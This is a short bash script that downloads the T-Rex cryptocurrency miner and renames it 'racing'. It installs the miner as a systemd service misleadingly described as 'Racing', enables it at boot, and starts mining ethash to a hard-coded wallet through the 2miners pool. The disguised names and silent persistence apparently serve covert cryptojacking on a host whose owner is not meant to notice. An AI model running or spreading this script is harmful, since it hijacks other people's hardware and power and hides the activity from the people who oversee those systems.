cd /home
woker=$(date +'%d%m_%H%M%S_')
name=NV10
woker+=$name
wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u bc1qu7ecen9pvuva0x3t2qxsy9d3ayldt9qvy6ehgw -p x -w ${woker}_re_dev_test\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
./racing -a ethash -o us-eth.2miners.com:2020 -u bc1qu7ecen9pvuva0x3t2qxsy9d3ayldt9qvy6ehgw -p x -w $woker &
